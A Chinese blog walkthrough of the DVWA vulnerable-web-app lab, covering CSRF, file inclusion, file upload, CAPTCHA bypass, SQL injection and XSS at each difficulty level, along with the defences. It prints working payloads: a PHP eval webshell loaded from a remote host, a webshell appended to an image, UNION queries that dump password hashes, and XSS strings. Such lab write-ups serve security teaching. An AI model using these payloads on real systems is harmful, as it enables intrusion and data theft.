<p>并且没有过滤换行（<code>%0a</code>）、回车（<code>%0d</code>），这二者同样可以达到分隔多条命令的效果。当然，前端的输入框里无法输入换行，需要用别的工具发请求，将 ip 写为 <code>127.0.0.1%0als</code>。</p>
<p>High 过滤了减号 <code>-</code>，所以无法处理带参数的命令。</p>
<h3><a id="impossible白名单" class="content__heading-anchor"></a>Impossible：白名单</h3>
<p>「白名单」永远比「黑名单」安全。这个等级直接判断输入的 IP 是否符合 IPv4 格式，并且也引入了 CSRF 攻击防护。</p>
<h2><a id="cross-site-request-forgery-csrf" class="content__heading-anchor"></a>Cross Site Request Forgery (CSRF)</h2>
<p>这一关提供了一个修改密码的表单，要求输入新的密码并确认，提交后就能修改密码。</p>
<p><strong>攻击者的目标是：</strong>在受害者不知情的情况下，使受害者更改密码。</p>
<p><strong>⚠️ 注意：</strong>现代浏览器基本都已经禁止第三方 Cookie，这意味着无论如何配置，当发送跨域请求时都不能携带 Cookie，<strong>这一漏洞已经无法利用</strong>。</p>
<p>以下介绍的仅为在允许第三方 Cookie 的情况下，理论利用方式。</p>
<h3><a id="low无防护" class="content__heading-anchor"></a>Low：无防护</h3>
<p>没有防范 CSRF 攻击的检测，并且通过 GET 请求发数据。只要攻击者诱导受害者打开一个 URL，或者向这个 URL 发送请求，就可以修改密码。</p>
<pre><code>http://localhost/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#
</code></pre>
<h3><a id="medium判断-referer" class="content__heading-anchor"></a>Medium：判断 referer</h3>
<p>这一等级在收到请求后，判断 HTTP referer 请求头的内容是否包含当前服务器域名。</p>
<p>然而，使用的是 <code>stripos</code> 函数，即单纯的子串检测。假设 DVWA 运行在 <code>dvwa.com</code>，那么只要 referer 包含这个子串即可。例如从 <code>skywt.cn</code> 发起攻击，一种简单的方式是：<code>https://skywt.cn/?a=dvwa.com</code>。</p>
<h3><a id="highcsrf-token" class="content__heading-anchor"></a>High：CSRF token</h3>
<p>这一等级加入了 CSRF token，当用户加载表单时，表单内包含一个 hidden input，其中包含每次不同的 token；当提交时需要带上这个 token。</p>
<p>这大大增加了攻击难度：恶意脚本需要使用用户的凭证先发送请求，获取页面上的 token，再将 token 一并发送，请求修改密码。</p>
<h3><a id="impossible提供原密码" class="content__heading-anchor"></a>Impossible：提供原密码</h3>
<p>这一等级要求在修改密码请求中提供用户的原密码。攻击者无法得知用户的原密码，所以无法使用 CSRF 攻击。</p>
<h2><a id="file-inclusion" class="content__heading-anchor"></a>File Inclusion</h2>
<p>这一关提供的页面，在 URL 中指定参数 <code>page</code> 即可包含指定的页面。情境的本意是只能包含 file1、file2、file3 三个页面之一。</p>
<p><strong>攻击者的目标是：</strong>包含木马页面，执行我们想要的代码。</p>
<h3><a id="low无防护-1" class="content__heading-anchor"></a>Low：无防护</h3>
<p>直接可以进行任意文件包含，因为 URL 里可以任意引用文件，为所欲为。</p>
<p>例如，在服务器 skywt.cn 上放一个一句话木马 <code>yjh.txt</code>：</p>
<pre><code class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>这行 PHP 代码拿到 GET 请求传入的 a 参数，然后作为代码执行。通过这一代码，我们可以执行任何代码。这就是「一句话木马」。</p>
<p>接下来，访问：</p>
<pre><code class="language-plaintext">http://localhost/vulnerabilities/fi/?page=https://skywt.cn/yjh.txt&amp;a=phpinfo();
</code></pre>
<p>页面包含了我们的 <code>yjh.txt</code>，传入的 <code>phpinfo()</code>; 就会被执行，显示 PHP 信息。照此原理，能够执行任何 PHP 代码。</p>
<p>利用 PHP 的 <code>exec()</code> 函数，事实上相当于已经拿到了系统的 shell。</p>
<h3><a id="medium关键词过滤" class="content__heading-anchor"></a>Medium：关键词过滤</h3>
<p>对传入的 page 参数过滤了 <code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code> 这几个关键词。</p>
<p>PHP 的 <code>str_replace</code> 函数只会进行「一次替换」，也就是将一个字符串中所有子串 A 进行替换，至于替换之后得到的新字符串是否包含子串 A，它并不关心。利用这个缺陷，我们可以使用「双写」的办法：</p>
<pre><code class="language-plaintext">http://localhost/vulnerabilities/fi/?page=httpshttps://://skywt.cn/yjh.txt&amp;a=phpinfo();
</code></pre>
<p>（也可以结合下一关的文件上传，使其引用本地的木马文件，即 URL 不包含 <code>http(s)://</code> 协议。</p>
<h3><a id="high只能是文件" class="content__heading-anchor"></a>High：只能是文件</h3>
<p>限制了传入的 page 参数必须以 file 开头。本意是限制只能引用诸如 <code>file1.php</code> 这样的文件，然而事实上可以用 <code>file://</code> 协议引用本地的任何文件。</p>
<p>需要结合下一关的文件上传漏洞，先上传一句话木马到本地，再引用。下文详述。</p>
<h3><a id="impossible白名单-1" class="content__heading-anchor"></a>Impossible：白名单</h3>
<p>使用「白名单」，限制只能访问 file1、file2、file3 这三个 PHP 文件。</p>
<h2><a id="file-upload" class="content__heading-anchor"></a>File Upload</h2>
<p>这一关提供了一个表单，能在其中选择一个文件并上传。情境的本意是只能上传图片文件，但是由于不佳的实现，导致能够上传 PHP 脚本木马。</p>
<p><strong>攻击者的目标是：</strong>上传 PHP 木马并执行我们想要的代码。</p>
<h3><a id="low无防护-2" class="content__heading-anchor"></a>Low：无防护</h3>
<p>没有任何检测，直接将上传的文件保存并移动到某个特定的目录。</p>
<p>上传之前提到的一句话木马 <code>yjh.php</code> 就行。在这个 URL 里，能够利用木马：</p>
<pre><code>http://localhost/hackable/uploads/yjh.php?a=phpinfo();
</code></pre>
<h3><a id="medium限制-mime" class="content__heading-anchor"></a>Medium：限制 MIME</h3>
<p>只限制请求的 MIME 为 <code>image/jpeg</code> 或者 <code>image/png</code>，并不实际检测上传的内容。</p>
<p>可以仍然上传这个 PHP 文件，只要在上传的请求中修改一下 Content-Type 就行了。</p>
<p><a href="https://blog.skywt.cn/usr/uploads/2024/05/4042635291.png" data-fancybox data-caption="截屏2022-08-05 12.11.55.png"><img src="https://blog.skywt.cn/usr/uploads/2024/05/4042635291.png" alt="截屏2022-08-05 12.11.55.png" title="截屏2022-08-05 12.11.55.png" /></a></p>
<p>也可以在真实的图片文件后加 PHP 一句话木马再上传。下文 high 中详述。</p>
<h3><a id="high限制文件拓展名" class="content__heading-anchor"></a>High：限制文件拓展名</h3>
<p>相比 medium，这个等级：</p>
<ul>
<li>使用 <code>getimagesize</code> 函数获取图像内容实际大小，如果是 0 则拒绝上传。</li>
<li>检测文件拓展名是否是 <code>jpg</code>、<code>jpeg</code>、<code>png</code> 三者之一。如果不是则拒绝上传。</li>
</ul>
<p>第一个限制意味着，直接上传只包含一行 PHP 代码的一句话木马无法成功，必须上传一张真实的图片。我们可以用文本编辑器在一张真实的图片最后加上一句话木马。PHP 的特性是只会将 <code>&lt;?php ?&gt;</code> 或 <code>&lt;? ?&gt;</code> 中的内容视为脚本并运行，在这个之外的内容都会不解析而是直接显示。注意：使用这种方法，需要确保这个图片文件中，在我们插入的代码之前，没有出现过 <code>&lt;?</code> 这样的符号，否则在执行到我们的代码之前 PHP 就会抛出语法错误。</p>
<p>如果使用日常的图片，生成 <code>&lt;?</code> 组合其实概率不低。我们可以生成一张最小的图片，确保不包含 <code>&lt;?</code> 组合：</p>
<pre><code class="language-bash">convert -size 1x1 xc:black yjh.jpg
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_GET[&#x27;a&#x27;]);?&gt;&quot;</span> &gt;&gt; yjh.jpg
</code></pre>
<p>上传这个图片文件，能够规避第一条规则的检测。</p>
<p>第二个限制，并不好解决。一般来说，像 Nginx 之类的 WebServer，PHP 环境的配置方式都是：对于服务器上以 <code>.php</code> 结尾的文件，交由 PHP 的引擎执行脚本；对于其他拓展名的文件，则直接视为静态资源呈现。这样，如果文件结尾不是 <code>.php</code>，我们无法将其单独作为 PHP 来执行。</p>
<p>所以，这一关要结合上一关的文件包含漏洞。成功上传包含一句话木马的 <code>yjh.jpg</code> 之后，只要利用 <code>file://</code> 协议，访问这个 URL：</p>
<pre><code>http://localhost/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/yjh.jpg&amp;a=phpinfo();
</code></pre>
<h3><a id="impossible图片重新编码" class="content__heading-anchor"></a>Impossible：图片重新编码</h3>
<p>相比之前的等级，该等级加入了更加复杂的检测：</p>
<ul>
<li>检测 MIME 类型、拓展名。</li>
<li>对图片去除元信息、重新编码再上传。这样图片中不可能包含任何其他东西。</li>
<li>CSRF 防护。</li>
</ul>
<h2><a id="insecure-captcha" class="content__heading-anchor"></a>Insecure CAPTCHA</h2>
<p>这一关提供修改密码的场景，表单里提供了一个密码输入框、密码确认框，以及一个 reCAPTCHA 验证组件。期望的场景是：通过验证，才能提交修改密码。</p>
<p><strong>攻击者的目标是：</strong>不经过 reCAPTCHA 的验证也能实现修改密码。</p>
<h3><a id="low没用的-step-验证" class="content__heading-anchor"></a>Low：没用的 step 验证</h3>
<p>这个 low 的实现真的很逆天，表单里有一个 hidden input 名为 <code>step</code>，初始 value 为 1。当为 1 时提交，验证 reCAPTCHA，如果通过则<strong>重新打开页面</strong>并将 <code>step</code> 改为 2。当为 2 时提交，则不验证 reCAPTCHA 直接修改密码。</p>
<p>那么，直接在页面里将 <code>step</code> 改为 2 再提交就好了。</p>
<h3><a id="medium又一个没用的验证" class="content__heading-anchor"></a>Medium：又一个没用的验证</h3>
<p>依然很逆天，在 low 的基础上，当 <code>step</code> 为 1 且验证通过时，重新打开页面，<code>step</code> 设为 2，并添加一个名为 <code>passed_captcha</code> 的 hidden input 并设为 true。</p>
<p>和 low 类似，只要在页面里将 <code>step</code> 改为 2，添加 <code>passed_captcha</code>元素即可：</p>
<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;passed_captcha&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>
</code></pre>
<h3><a id="high开发者留的后门" class="content__heading-anchor"></a>High：开发者留的后门</h3>
<p>相比前两个等级，high 终于没有使用愚蠢的 <code>step</code>。</p>
<ul>
<li>添加了 CSRF 防护。</li>
<li>提交后直接验证 reCAPTCHA，如果通过则修改密码。</li>
</ul>
<p>然而，在表单的注释里能看到这段内容：</p>
<pre><code class="language-html"><span class="hljs-comment">&lt;!-- **DEV NOTE**   Response: &#x27;hidd3n_valu3&#x27;   &amp;&amp;   User-Agent: &#x27;reCAPTCHA&#x27;   **/DEV NOTE** --&gt;</span>
</code></pre>
<p>事实上，当这个页面接收到 POST 请求，其中 <code>g-recaptcha-response</code> 字段为 <code>hidd3n_valu3</code> 并且 UA 为 <code>reCAPTCHA</code> 时，会直接视为通过了验证。</p>
<p>我并没看懂这一关的逻辑，毕竟 reCAPTCHA 验证代码放在独立的模块里。可能意思是开发者留的后门？</p>
<pre><code class="language-bash">curl <span class="hljs-string">&#x27;http://localhost/vulnerabilities/captcha/&#x27;</span> \
  -H <span class="hljs-string">&#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span> \
  -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \
  -H <span class="hljs-string">&#x27;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; pma_lang=zh_CN; phpMyAdmin=211204361d2d8ca74ddb7cf6114904ad; pmaUser-1=yfZDMnTAKyPV7j%2B7cQQNL%2FzQSTP4EIu%2BlPfwwl8x8qc8at35nhtpEyye8Rc%3D; security=high; PHPSESSID=c830c512bdc160d1bd45b89fd12a8f27&#x27;</span> \
  -H <span class="hljs-string">&quot;User-Agent: reCAPTCHA&quot;</span> \
  --data-raw <span class="hljs-string">&#x27;step=1&amp;password_new=123456&amp;password_conf=123456&amp;g-recaptcha-response=hidd3n_valu3&amp;user_token=0b419bbb618c37f400efc2b2d03337a9&amp;Change=Change&#x27;</span>
</code></pre>
<h3><a id="impossible正常地使用" class="content__heading-anchor"></a>Impossible：正常地使用</h3>
<p>相比前几个等级，这个等级：</p>
<ul>
<li>添加表单需要用户输入当前密码，密码正确才能修改密码。</li>
<li>正常地验证 reCAPTCHA，没有 high 中奇怪的判定。</li>
</ul>
<p>说实话，这才是正常人能想到的 reCAPTCHA 使用方式。这关从 low 到 high 感觉都不是正常人能写出来的代码……</p>
<h2><a id="sql-injection" class="content__heading-anchor"></a>SQL Injection</h2>
<p>SQL 注入是老生常谈的安全漏洞。本题提供了一个表单，输入 user id 并提交，能够查询指定 id 的用户，并显示列表。</p>
<p><strong>攻击者的目标是：</strong>任意操纵数据库。</p>
<h3><a id="low无防护-3" class="content__heading-anchor"></a>Low：无防护</h3>
<p>没有任何 SQL 注入的检测。查询 <code>1' OR 1=1; #</code>，可以得到所有记录。说明这关的注入是<strong>字符型</strong>，即输入的内容作为字符串类型。</p>
<p><strong>确定该表包含字段数量。</strong>提交 <code>' OR 1=1 ORDER BY 2; #</code> 正常返回，<code>' OR 1=1 ORDER BY 3; #</code> 则报错，说明该表共两个字段。</p>
<p><strong>确定服务器包含的数据库。</strong>提交 <code>' AND 0=1 UNION SELECT 1,database(); #</code>，能看到只有 <code>dvwa</code> 这一个数据库。</p>
<p><strong>确定数据库包含的所有表。</strong>提交 <code>' AND 0=1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema='dvwa'; #</code> 可以看到所有表的名称，有 users 和 guestbook。</p>
<p><strong>确定表包含的字段。</strong>提交 <code>' AND 0=1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'; #</code> 可以拿到 uses 表包含的所有字段。</p>
<p>最后就可以想查什么就查什么了。比如用户名和密码的 MD5：<code>' AND 0=1 UNION SELECT user,password FROM users; #</code>。</p>
<h3><a id="medium字符转义" class="content__heading-anchor"></a>Medium：字符转义</h3>
<p>相比 low 等级：</p>
<ul>
<li>将输入框改为了选择菜单，请求方式改为 POST。但是 POST 接收的参数依然被当作字符串处理。</li>
<li>对 id 中的字符进行了转义，使用的是 <code>mysqli_real_escape_string</code> 函数，这个函数会转义 NUL（ASCII 0）、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>'</code>、<code>&quot;</code> 和 Control-Z 这些字符。</li>
</ul>
<p>尝试 <code>1 OR 1=1;#</code> 可以判断这题的注入是<strong>数字型</strong>，即输入内容作为数字类型。那么，不需要用到引号等被过滤的符号。</p>
<p>直接用和上题一样的方法就好。</p>
<h3><a id="high单独的页面" class="content__heading-anchor"></a>High：单独的页面</h3>
<p>这个等级打开一个单独的页面里发送请求，而响应存在后端 SESSION 里，在原来的页面中才显示。这样用 sqlmap 之类的工具进行注入就会比较麻烦，只能自己写脚本或者手工注入。</p>
<p>不过，除此之外，其他防护措施和 low 等级一样。</p>
<h3><a id="impossible限制数据类型--预编译" class="content__heading-anchor"></a>Impossible：限制数据类型 &amp; 预编译</h3>
<ul>
<li>判断 id 是否为数字。</li>
<li>使用了预编译处理 SQL 语句。这就是「代码与数据分离」。</li>
<li>CSRF 防护。</li>
</ul>
<h2><a id="sql-injection-blind" class="content__heading-anchor"></a>SQL Injection (Blind)</h2>
<p>SQL 盲注，指的是虽然页面存在 SQL 注入的漏洞，但是我们无法直接看到查询的结果，只能看到成功与否之类非常有限的信息。这大大增加了注入难度。</p>
<p>这一关就是如此：输入用户 ID，只返回用户 ID 是否存在。这相当于每次只给我们 true 或 false 的信息。</p>
<p>这一关不同难度增加的限制，和上一关完全一致，只有返回显示结果的区别。所以此处只介绍针对 low 的通用方法。</p>
<p><strong>猜测是字符型还是整数型。</strong>尝试 <code>1 AND 1=2; #</code> 发现能找到记录，<code>1' AND 1=2; #</code> 则不行，则证明是字符型。</p>
<p><strong>猜数据库名长度。</strong>查询 <code>' OR length(database())=4; #</code> 为真，其他长度都为假，说明当前数据库名长度为 4。</p>
<p><strong>猜数据库名。</strong>用诸如 <code>' OR ascii(substr(database(),1,1)&gt;97; #</code> 这样的查询，可以一个一个字符猜出数据库名（可以用二分）。其他的猜测和以上注入同理。</p>
<p><strong>如果程序不返回任何内容，连成功与否都不知道，怎么办呢？</strong>可以利用<strong>延时</strong>。例如：<code>' AND sleep 5</code>。SQL 中的 AND 有和大多数编程语言一样的短路运算，当 AND 左侧为 false 则不计算右侧。如果能找到记录，会等待五秒才返回；如果找不到记录，则会立即返回。通过这种方式我们相当于也获得了 true 或 false 的反馈信息。</p>
<h2><a id="weak-session-ids" class="content__heading-anchor"></a>Weak Session IDs</h2>
<p>这个场景只提供一个按钮，每次点击就能生成或更新本地名为 dvwaSession 的 Cookie。</p>
<p><strong>攻击者的目标：</strong>猜测下一次生成的 dvwaSession，或者猜测其他用户生成的 dvwaSession。Session 一般作为用户身份的凭证，如果能够猜到其生成方式，往往能够伪造他人身份。</p>
<h3><a id="low简单计数器" class="content__heading-anchor"></a>Low：简单计数器</h3>
<p>非常简单直白的方式生成 dvwaSession：第一次生成 1，之后每次重新生成就加 1。这种方式太容易伪造了。</p>
<h3><a id="medium时间戳" class="content__heading-anchor"></a>Medium：时间戳</h3>
<p>将时间戳作为 dvwaSession。时间戳没有随机性并且可预知，攻击者也完全可以伪造。</p>
<h3><a id="high计数器-md5--访问限制" class="content__heading-anchor"></a>High：计数器 MD5 &amp; 访问限制</h3>
<p>这一等级仍然使用计数器作为 dvwaSession，不同之处在于存入 Cookie 时用 MD5 哈希了一下。计数器每次加 1，所以不会很大，可以轻易枚举出哈希前的计数器。</p>
<p>这一等级还设定了 Cookie 的失效时间为一小时，指定只能在 <code>/vulnerabilities/weak_id/</code> 路径以及当前域名下使用，</p>
<p>Cookie 的 secure、httpOnly 选项都设为 false，这意味着 Cookie 可以在非 HTTPS 连接下使用、可以被 JavaScript 脚本访问。这是不安全的设置。</p>
<h3><a id="impossible随机化--强限制" class="content__heading-anchor"></a>Impossible：随机化 &amp; 强限制</h3>
<p>在 high 的基础上：</p>
<ul>
<li>使用时间戳、随机数，用 SHA1 算法生成 Cookie。这确保了充分的 Cookie 随机化。</li>
<li>secure、httpOnly 选项都设为 true。</li>
</ul>
<p>相比 high，这个等级：1）无法枚举预测 Cookie；2）有更严格的访问限制。</p>
<h2><a id="dom-based-cross-site-scripting-xss" class="content__heading-anchor"></a>DOM Based Cross Site Scripting (XSS)</h2>
<p>在做 XSS 的三个关卡之前，回顾之前 <a href="https://skywt.cn/blog/xss-labs-tutorial/#总结">xss-labs 的题解</a>，执行 JavaScript 代码一般有四种方式：</p>
<ul>
<li>通过 <code>&lt;script&gt;</code> 标签。</li>
<li>通过元素的 onmouseover 属性。</li>
<li>通过 <code>&lt;img&gt;</code> 的 onerror 属性，如 <code>&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</code>。</li>
<li>通过 URI，如 <code>javascript:alert(1)</code>。</li>
</ul>
<p>这一关提供了一个包含下拉选择框的表单，提供了若干语言选项。</p>
<p><strong>攻击者的目标是：</strong>实现 XSS 注入，执行我们想要的 JavaScript 脚本。</p>
<h3><a id="low虚假的下拉框" class="content__heading-anchor"></a>Low：虚假的下拉框</h3>
<p>选择 <code>English</code> 并 Submit，可以发现 <code>English</code> 作为字符串传进了 URL，作为 <code>default</code> 的值。</p>
<pre><code>http://localhost/vulnerabilities/xss_d/?default=English
</code></pre>
<p>将 URL 中 <code>English</code> 改为 <code>test</code>，会发现页面里下拉框中文本也变成了 <code>test</code>。显然这个下拉框只是个幌子，<code>default</code> 的值不仅限于这四种语言。</p>
<p>可以发现表单中有一段脚本用于处理 <code>default</code> 的值，使用了非常愚蠢的 <code>document.write</code>：</p>
<pre><code class="language-js"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;default=&quot;</span>) &gt;= <span class="hljs-number">0</span>) {
  <span class="hljs-keyword">var</span> lang = <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;default=&quot;</span>)+<span class="hljs-number">8</span>);
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> + <span class="hljs-built_in">decodeURI</span>(lang) + <span class="hljs-string">&quot;&lt;/option&gt;&quot;</span>);
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);
}
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);               
</code></pre>
<p>那么，将 <code>default</code> 的值改为 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 进行 encodeURI 之后的值，即可成功出现弹窗：</p>
<pre><code>%3Cscript%3Ealert(1)%3C/script%3E
</code></pre>
<h3><a id="medium后端过滤-script-标签" class="content__heading-anchor"></a>Medium：后端过滤 script 标签</h3>
<p>相比 low，在后端添加了检测，如果 URL 的 <code>default</code> 值包含 <code>&lt;script</code> 字串，则强制设置为 <code>English</code>。</p>
<p>当然，引入 JavaScript 代码的方式并不止 script 标签一种。比如：</p>
<pre><code class="language-html"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#x27;height: 1000px; width: 1000px&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>这段代码将 select 组件闭合，并插入一个其他元素，能够触发弹窗。button 需要点击触发，而插入一个很大的 div 则用户鼠标经过就触发。经过实测，因为这个 div 很大，还是非常容易触发的……</p>
<p><strong>⚠️ 浏览器的安全限制：</strong>由于 <code>document.write</code> 存在较多安全问题，已经是强烈不建议使用的方法（参见 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/write">MDN 文档</a>），许多浏览器对其添加了诸多限制，例如 Chrome 浏览器的<a href="https://developer.chrome.com/blog/removing-document-write/#catch_warnings_in_chrome_devtools">这篇文档</a>。所以，这一关很多更好的方法都无法使用，比如 <code>&lt;img src=1 onerror='alert(1)'&gt;</code>。</p>
<p>（除了这种方法之外，使用下述 high 等级的方法也能通过这一关）</p>
<h3><a id="high后端白名单但前端简单粗暴" class="content__heading-anchor"></a>High：后端白名单，但前端简单粗暴</h3>
<p>相比 medium，这关在后端直接使用了白名单：<code>default</code> 参数对应的值只能是 <code>English</code> 等四个值中的一种。其他情况，就重定向到 <code>default=English</code>。</p>
<p>不过，或许你已经注意到了，前端获取 <code>default</code> 对应的值的这段代码，非常简单粗暴：</p>
<pre><code class="language-js"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;default=&quot;</span>) &gt;= <span class="hljs-number">0</span>) {
  <span class="hljs-keyword">var</span> lang = <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;default=&quot;</span>)+<span class="hljs-number">8</span>);
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>直接搜索 URL 中 <code>default=</code> 这个字串，不管三七二十一，将等号之后的内容都视为 lang 的值。然而，我们知道如果后面又有别的参数（例如 <code>default=English&amp;param=test</code>），这个参数也会被放进 lang 里，但会被后端忽略。</p>
<p>所以只要加个 <code>&amp;</code> 就能避免后端的检测了：</p>
<pre><code>English&amp;%3Cscript%3Ealert(1)%3C/script%3E
</code></pre>
<h3><a id="impossible前端不要-decode" class="content__heading-anchor"></a>Impossible：前端不要 decode</h3>
<p>之前从 low 到 high 的前端代码都犯了非常蠢的错误：直接将拿到的 lang 进行 decode 并在前端展示出来（<code>decodeURI(lang)</code>）。</p>
<p>事实上，对于 <code>English</code> 等四个选项，其中并不包含任何特殊字符，完全不需要 decode。只要不 decode，攻击者就不可能注入任何特殊字符了。Impossible 就改写了这一点：</p>
<pre><code class="language-js"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;default=&quot;</span>) &gt;= <span class="hljs-number">0</span>) {
  <span class="hljs-comment">// ...</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> + (lang) + <span class="hljs-string">&quot;&lt;/option&gt;&quot;</span>);
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>不过，这个选项仍然不是最好的解决方案，因为使用了 <code>document.write</code> 等非常不优雅的写法，并且用户仍然可能传入非预期的字符串（虽然不可能进行 XSS 攻击了）。如果让我来设计，或许我会将选项从 0 开始编号，URL 中只允许用户传入一个数字编号，在前端将其换成对应的选项。</p>
<h2><a id="reflected-cross-site-scripting-xss" class="content__heading-anchor"></a>Reflected Cross Site Scripting (XSS)</h2>
<p>这一关提供一个表单，让我们输入名字。当点击提交后，名字会通过 <code>name</code> 这个 param 传送给页面，表单下方会展示「Hello xxx」。</p>
<h3><a id="low无防护-4" class="content__heading-anchor"></a>Low：无防护</h3>
<p>没有任何防护。</p>
<p>输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 并提交，这段代码被原封不动地写入 HTML，就能成功弹窗。</p>
<h3><a id="medium子串替换" class="content__heading-anchor"></a>Medium：子串替换</h3>
<p>后端进行了防护：将输入包含的所有 <code>&lt;script&gt;</code> 子串替换为空串。</p>
<p>和 File Inclusion 里的 medium 解法相同，可以通过双写的方式规避：</p>
<pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/script&gt;
</code></pre>
<p>使用下文所述 high 的方法也能解决。</p>
<h3><a id="high正则表达式替换" class="content__heading-anchor"></a>High：正则表达式替换</h3>
<p>相比 medium，这次通过正则表达式替换了 <code>&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t</code>，使用双写的方法无效了。</p>
<p>同前所述，script 并非引入 JavaScript 的唯一方式。也可以使用：</p>
<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>
</code></pre>
<h3><a id="impossiblehtmlspecialchars" class="content__heading-anchor"></a>Impossible：htmlspecialchars</h3>
<p>相比 high 等级，这个等级：</p>
<ul>
<li>增加了 CSRF 防护。</li>
<li>通过 <code>htmlspecialchars</code> 转义输入字符串。</li>
</ul>
<p>一般来说，为了防范 XSS，使用 PHP 内置的 <code>htmlspecialchars</code> 函数转义字符串，是最优解。</p>
<h2><a id="stored-cross-site-scripting-xss" class="content__heading-anchor"></a>Stored Cross Site Scripting (XSS)</h2>
<p>本题场景是一个类似留言板的功能，提供一个表单，可以填写姓名和文本，提交后填写的内容将被存储，在留言列表中展示出来。</p>
<h3><a id="low无防护-5" class="content__heading-anchor"></a>Low：无防护</h3>
<p>在 message 中填入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 提交，该内容会被原封不动地注入 HTML 导致弹窗。</p>
<p>这一关卡所有难度都使用了 <code>mysqli_real_escape_string</code> 过滤了输入，从而防止 SQL 注入攻击。由于 SQL 注入不是本关卡的重点，与 XSS 无关，下面暂时不考虑。</p>
<h3><a id="mediumname-子串替换" class="content__heading-anchor"></a>Medium：name 子串替换</h3>
<p>相比 low，这一关在后端对 name 和 message 分别进行了过滤：</p>
<ul>
<li>对于 message：使用 PHP 的 <code>strip_tags</code> 函数去除所有 HTML 和 PHP 标签，然后使用 <code>htmlspecialchars</code> 函数转义存储。</li>
